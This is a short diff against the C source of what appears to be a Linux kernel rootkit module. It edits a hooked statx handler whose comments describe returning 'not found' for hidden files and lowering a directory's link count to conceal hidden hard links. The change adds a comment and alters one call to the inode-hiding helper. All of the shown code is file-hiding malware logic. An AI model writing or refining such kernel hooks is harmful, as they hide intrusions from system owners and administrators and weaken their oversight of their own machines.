@@ -1019,6 +1019,7 @@ static long m_vfs_statx(int dfd, const char __user *filename, int flags, struct 
      *  Return not found to userspace if name is present (file,dir),
      *  otherwise count the number of hidden hard-links
      *      and use it to decrement "Links:"
+     *  Check: if it can be optimized
      * */
     if (!copy_from_user((void*)kernbuf, filename, sizeof(kernbuf)-1)) {
         if (strlen(kernbuf) > 0) {
@@ -1030,7 +1031,7 @@ static long m_vfs_statx(int dfd, const char __user *filename, int flags, struct 
              * Tamper 'nlink', if needed.
              */
             if (S_ISDIR(stat->mode)) {
-                int count = fs_is_dir_inode_hidden(name, stat->ino);
+                int count = fs_is_dir_inode_hidden(stat->ino);
                 if (count > 0) {
                     prinfo("%s: file match ino=%llu nlink=%d count=%d\n", __func__, stat->ino, stat->nlink, count);
                     stat->nlink -= count;
